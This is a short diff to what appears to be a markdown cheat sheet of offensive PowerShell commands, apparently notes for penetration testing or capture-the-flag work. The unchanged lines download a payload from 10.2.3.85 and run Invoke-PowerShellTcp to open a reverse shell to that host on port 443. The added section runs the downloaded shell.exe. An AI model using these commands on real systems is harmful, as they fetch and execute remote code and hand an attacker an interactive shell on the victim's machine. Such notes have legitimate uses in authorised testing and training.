@@ -32,3 +32,9 @@ powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.2.3.85/she
 powershell iex (New-Object Net.WebClient).DownloadString('http://10.2.3.85/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.2.3.85 -Port 443
 ```
 
+## Running Executable
+```
+c:\> start-process shell.exe
+c:\> .\shell.exe
+```
+
